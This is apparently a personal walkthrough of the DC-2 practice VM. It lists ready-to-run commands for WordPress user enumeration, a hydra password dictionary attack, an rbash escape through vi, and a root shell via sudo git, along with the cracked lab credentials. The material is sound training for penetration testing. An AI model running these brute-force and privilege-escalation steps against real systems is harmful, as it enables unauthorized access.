# DC-2

## Port Scan
```bash
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)

```

### Port 80: Wordpress

![[Pasted image 20220510071643.png]]

#### Username disclosure on the login screen

existing user

![[Pasted image 20220510072513.png]]

non-existing user

![[Pasted image 20220510072518.png]]

a clue

![[Pasted image 20220510072549.png]]

nmap script scan `http-wordpress-users` found a few users.

![[Pasted image 20220510210044.png]]

`users.txt` contains the users pictured above

`dc2-wordlists.txt` contains the output of this `cewl` command:

```bash
cewl http://dc-2/ -m 6 -w dc2-wordlists.txt
```

Then did a dictionary attack with the .txt files mentioned above

```bash
hydra -L users.txt -P dc2-wordlists.txt -s 80 dc-2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&testcookie='1'&wp-submit='Log+In':F=The password you entered"
```

found 2 good sets of credentials

![[Pasted image 20220510210316.png]]

`tom: parturient`

`jerry: adipiscing`

another clue

![[Pasted image 20220510210718.png]]

I got impatient looking for a way to exploit wordpress, and discovered that tom is able to log in via ssh

![[Pasted image 20220510212320.png]]

BUUUUT it's an rbash shell

![[Pasted image 20220510212441.png]]

Maybe one of the available binaries will be helpful

![[Pasted image 20220510214803.png]]

was able to break out with some [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#shell)

```bash
vi
:set shell=/bin/sh
:shell
```


![[Pasted image 20220510214943.png]]

I was able to `su` to jerry

```bash
/bin/su jerry
```

the password was the same one from wordpress `adipiscing`

![[Pasted image 20220510215231.png]]

'no hints' they say. But that last line seems like a cheesy joke. Maybe SUID for `git` or something similar is going to be the root path.

lol

![[Pasted image 20220510215627.png]]

[GTFOBins](https://gtfobins.github.io/gtfobins/git/#sudo) to the rescue again!

I opted for path `b` in SUDO

```bash
sudo git -p help config
!/bin/sh
```

![[Pasted image 20220510215739.png]]

![[Pasted image 20220510215916.png]]